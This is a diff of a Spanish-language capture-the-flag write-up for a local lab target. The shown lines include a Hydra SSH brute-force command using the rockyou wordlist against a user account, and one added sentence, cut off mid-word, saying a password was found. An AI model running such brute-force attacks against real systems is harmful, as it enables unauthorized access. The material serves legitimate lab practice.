@@ -188,7 +188,7 @@ Malditos muchachos. Todos son iguales. Pero tú, en tu psicología de tres parte
 Este fichero no parece darnos mucha información relevante.
 # Usuario Russoski
 
-Realizamos una taque de fuerza bruta con el nombre de usuario encontrado y el servicio **SSH/*.
+Realizamos una taque de fuerza bruta con el nombre de usuario encontrado y el servicio **SSH**.
 
 ```
 > hydra -l russoski -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
@@ -208,7 +208,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 16:19:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 16:20:23
 ```
 
-
+El resultado nos arroja un ncontraseña donde conseguimos entrar en el sistema objet
 
 
 ```
